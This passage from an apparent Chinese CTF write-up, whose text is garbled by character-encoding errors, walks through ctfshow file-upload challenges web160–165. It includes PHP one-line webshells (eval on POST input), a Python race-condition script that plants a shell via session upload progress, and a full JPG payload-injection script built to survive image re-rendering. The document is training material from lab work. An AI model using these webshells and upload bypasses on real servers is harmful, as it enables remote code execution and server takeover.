title="æ—¥å¿—åŒ…å«"></a>æ—¥å¿—åŒ…å«</h3><p>è¿™é¢˜å°†ç©ºæ ¼å’Œ``åå¼•å·å’Œlogè¿‡æ»¤æ‰äº†ï¼Œæ‰€ä»¥ä¸Šä¼ çš„æ—¶å€™è¦æ³¨æ„ç•¥è¿‡å¤šä½™çš„ç©ºæ ¼ï¼Œlogå¯ä»¥ç”¨ç‚¹å·æ‹¼æ¥ç»•è¿‡ï¼Œä¸”æœ¬é¢˜ä¸èƒ½ä½¿ç”¨ä¸Šé¢˜çš„æ–¹æ³•ã€‚<br>nginxçš„æ—¥å¿—æ–‡ä»¶åœ¨/var/log/nginx/access.logé‡Œ</p><p>æ³¨æ„è¿™æ¬¡çš„.user.iniæ–‡ä»¶å†…å®¹æ˜¯ï¼š<br><code>auto_prepend_file=1.png</code>éœ€è¦å°†ç­‰å·ä¸¤ç«¯ç©ºæ ¼åˆ é™¤<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688446683068-0bcfe710-e681-4a91-aa17-840a2c552880.png" alt="image.png">1.png <code>&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</code><br>æŒ‰ç…§wpè¿™ç§å†™æ³• ä¼šå‘ç°æç¤ºæ ¼å¼é”™è¯¯ã€‚<br>ç»è¿‡æŸ¥è¯¢èµ„æ–™å‘ç°ï¼Œæ­£ç¡®çš„å†™æ³•åº”è¯¥æ˜¯ï¼š<br>å°†includeå’Œåœ°å€ä¸­é—´åŠ ä¸€ä¸ªæ¢è¡Œã€‚<br>å…ˆç”¨1æ ‡è®°ä¸€ä¸‹ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688447711896-937e1a62-fa1a-4d66-a9f2-ae783d511c8a.png" alt="image.png"><br>åˆ‡æ¢åˆ°hexéƒ¨åˆ†<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688447786035-2cd193c2-79dd-437c-955c-bf878c13b927.png" alt="image.png"><br>å°†1æ”¹ä¸º0då³å¯ä¸Šä¼ æˆåŠŸ<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688447819911-82544bdd-ea96-40a4-93d5-39096e9badf1.png" alt="image.png"><br>ç›´æ¥è®¿é—®å³å¯ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688448270283-a83e5567-2d1c-4f82-9ee1-50e690b068d3.png" alt="image.png"> </p><h1 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h1><h3 id="å›¾ç‰‡å¤´"><a href="#å›¾ç‰‡å¤´" class="headerlink" title="å›¾ç‰‡å¤´"></a>å›¾ç‰‡å¤´</h3><p>åŠ ä¸Šå›¾ç‰‡å¤´ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89A</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688480295049-d3bc1e6b-07ae-4e94-99d2-a3445fcc1b94.png" alt="image.png"><br>å›¾ç‰‡é©¬åŒç†<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688480375207-109baf2b-5e1b-47b9-93ae-a86cc031df77.png" alt="image.png"><br>UAä¼ å…¥ä¸€å¥è¯æœ¨é©¬ã€‚</p><h1 id="web162ã€web163ï¼ˆè¿œç¨‹æ–‡ä»¶åŒ…å«-è¿™é‡Œä¸å¤ç°äº†-æ¡ä»¶ç«äº‰éœ€è¦ååŠå¤œ-æŒºä¸ä½ï¼‰"><a href="#web162ã€web163ï¼ˆè¿œç¨‹æ–‡ä»¶åŒ…å«-è¿™é‡Œä¸å¤ç°äº†-æ¡ä»¶ç«äº‰éœ€è¦ååŠå¤œ-æŒºä¸ä½ï¼‰" class="headerlink" title="web162ã€web163ï¼ˆè¿œç¨‹æ–‡ä»¶åŒ…å« è¿™é‡Œä¸å¤ç°äº† æ¡ä»¶ç«äº‰éœ€è¦ååŠå¤œ æŒºä¸ä½ï¼‰"></a>web162ã€web163ï¼ˆè¿œç¨‹æ–‡ä»¶åŒ…å« è¿™é‡Œä¸å¤ç°äº† æ¡ä»¶ç«äº‰éœ€è¦ååŠå¤œ æŒºä¸ä½ï¼‰</h1><p>è¿‡æ»¤äº†<code>.</code>ï¼Œæ‰€ä»¥ä¸èƒ½åˆ©ç”¨æ—¥å¿—åŒ…å«äº†ï¼Œå…ˆæ­£å¸¸ä¸Šä¼ .user.ini<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688481049862-c54f9e2a-74b3-40c2-a695-f853daba81d5.png" alt="image.png"></p><h2 id="æ–¹æ³•ä¸€-è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#æ–¹æ³•ä¸€-è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–¹æ³•ä¸€ è¿œç¨‹æ–‡ä»¶åŒ…å«"></a>æ–¹æ³•ä¸€ è¿œç¨‹æ–‡ä»¶åŒ…å«</h2><p>å› ä¸ºä¸èƒ½æœ‰.æ‰€ä»¥å°†IPè½¬æ¢ä¸ºåè¿›åˆ¶ï¼Œç„¶åä¿®æ”¹é»˜è®¤ä¸ºä¸€å¥è¯æœ¨é©¬ã€‚ä¹Ÿå°±æ˜¯ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688481931827-fd1cc178-4590-4fa9-a4a5-c2f8c1e80c9d.png" alt="image.png"><br>è¿™é‡Œç”±äºéœ€è¦ä¿®æ”¹é»˜è®¤é¡µé¢è¿‡äºéº»çƒ¦ï¼Œè¿™é‡Œå°±æ²¡æœ‰å¤ç°ã€‚</p><h2 id="æ–¹æ³•äºŒ-sessionæ¡ä»¶ç«äº‰"><a href="#æ–¹æ³•äºŒ-sessionæ¡ä»¶ç«äº‰" class="headerlink" title="æ–¹æ³•äºŒ sessionæ¡ä»¶ç«äº‰"></a>æ–¹æ³•äºŒ sessionæ¡ä»¶ç«äº‰</h2><p>åˆ©ç”¨session.upload_progresså°†æœ¨é©¬å†™å…¥sessionæ–‡ä»¶ï¼Œç„¶ååŒ…å«è¿™ä¸ªsessionæ–‡ä»¶ã€‚<br>é¦–å…ˆåœ¨.user.iniåŒ…å«/tmp/sess_test</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time : 20.12.5 13:52</span></span><br><span class="line"><span class="comment"># @author:lonmar</span></span><br><span class="line">import io</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;test&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;ctf&quot;</span>: <span class="string">&quot;/tmp/sess_test&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cmd&quot;</span>: <span class="string">&#x27;system(&quot;tac ../f*&quot;);&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">write</span>(session):</span><br><span class="line">    <span class="keyword">while</span> event.<span class="title function_ invoke__">isSet</span>():</span><br><span class="line">        f = io.<span class="title function_ invoke__">BytesIO</span>(b<span class="string">&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.<span class="title function_ invoke__">post</span>(<span class="string">&#x27;http://73c8baa3-fd27-4ce6-90d6-107d6eb00f5b.challenge.ctf.show/&#x27;</span>,</span><br><span class="line">                            data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,</span><br><span class="line">                            files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;test.txt&#x27;</span>, f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">read</span>(session):</span><br><span class="line">    <span class="keyword">while</span> event.<span class="title function_ invoke__">isSet</span>():</span><br><span class="line">        res = session.<span class="title function_ invoke__">post</span>(</span><br><span class="line">            <span class="string">&#x27;http://73c8baa3-fd27-4ce6-90d6-107d6eb00f5b.challenge.ctf.show/&#x27;</span>,</span><br><span class="line">            data=data</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#123;&#x27;</span> in res.text:</span><br><span class="line">            <span class="keyword">print</span>(res.text)</span><br><span class="line">            event.<span class="title function_ invoke__">clear</span>()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&#x27;[*]retrying...&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event = threading.<span class="title function_ invoke__">Event</span>()</span><br><span class="line">    event.<span class="title function_ invoke__">set</span>()</span><br><span class="line">    with requests.<span class="title function_ invoke__">session</span>() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">            threading.<span class="title function_ invoke__">Thread</span>(target=write, args=(session,)).<span class="title function_ invoke__">start</span>()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">            threading.<span class="title function_ invoke__">Thread</span>(target=read, args=(session,)).<span class="title function_ invoke__">start</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸€ç›´ä¹Ÿç«äº‰ä¸åˆ°ã€‚<br>åº”è¯¥æ˜¯çº¿ç¨‹çš„åŸå› ï¼Œä»–è¿™ä¸ªç«äº‰æ¡ä»¶åªæœ‰ååŠå¤œæ‰å¼€æ”¾ã€‚è¿™é‡Œå°±ä¸å¤ç°äº†ã€‚</p><h1 id="web164"><a href="#web164" class="headerlink" title="web164"></a>web164</h1><p>ä½¿ç”¨ç”Ÿæˆå›¾ç‰‡é©¬ï¼š<br><a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator">https://github.com/huntergregal/PNG-IDAT-Payload-Generator</a><br>ä½¿ç”¨å‘½ä»¤ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python generate.py -m php -o <span class="number">1</span>.png</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆçš„å›¾ç‰‡æ–‡æœ¬å†…å®¹ä¼šå‡ºç°ï¼š<code>&lt;?=$_GET[0]($_POST[1]);?&gt;</code><br>å¯¹åº”ä¼ å€¼ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688889962772-0ebf85cd-590f-41dc-88d7-5d5554df2bf9.png" alt="image.png"><br>ä¸‹è½½å›¾ç‰‡ï¼Œä»¥æ–‡æœ¬çš„æ ¼å¼æ‰“å¼€å°±ä¼šå‘ç°å†…å®¹ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688890006709-fa1d6252-3631-4a0a-bd11-062d0f875536.png" alt="image.png"></p><h1 id="web165ï¼ˆå‚»é€¼åº“ä¸€ç›´å¯¼ä¸è¿›å»ï¼‰"><a href="#web165ï¼ˆå‚»é€¼åº“ä¸€ç›´å¯¼ä¸è¿›å»ï¼‰" class="headerlink" title="web165ï¼ˆå‚»é€¼åº“ä¸€ç›´å¯¼ä¸è¿›å»ï¼‰"></a>web165ï¼ˆå‚»é€¼åº“ä¸€ç›´å¯¼ä¸è¿›å»ï¼‰</h1><h3 id="äºŒæ¬¡æ¸²æŸ“"><a href="#äºŒæ¬¡æ¸²æŸ“" class="headerlink" title="äºŒæ¬¡æ¸²æŸ“"></a>äºŒæ¬¡æ¸²æŸ“</h3><p>è¿™æ¬¡å›¾ç‰‡ä¸Šä¼ ä¹‹åä¼šè¢«äºŒæ¬¡æ¸²æŸ“ã€‚<br>å¯ä»¥å…ˆå°†å›¾ç‰‡æ¸²æŸ“ä¸€å¼ ï¼Œç„¶åå†å†™å…¥æœ¨é©¬ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688890383585-00cf1a9c-19b5-4f12-bafc-08a45e71214b.png" alt="image.png"><br>äºŒæ¬¡æ¸²æŸ“ä¹‹åå†™å…¥æœ¨é©¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span></span><br><span class="line"><span class="comment">If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">See also:</span></span><br><span class="line"><span class="comment">https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=eval(\$_POST[7]);?&gt;&quot;</span>; <span class="comment">//æ³¨æ„$è½¬ä¹‰</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">    <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">    <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">        <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">        <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">        <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">            <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">            <span class="variable">$outStreamTmp</span> =</span><br><span class="line">                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) .</span><br><span class="line">                <span class="variable">$miniPayload</span> .</span><br><span class="line">                <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) .</span><br><span class="line">                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">            <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                <span class="variable">$outStream</span> =</span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) .</span><br><span class="line">                    <span class="variable">$miniPayload</span> .</span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                        <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                        <span class="number">0</span>,</span><br><span class="line">                        <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) .</span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">            &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">    <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">    <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">            <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) 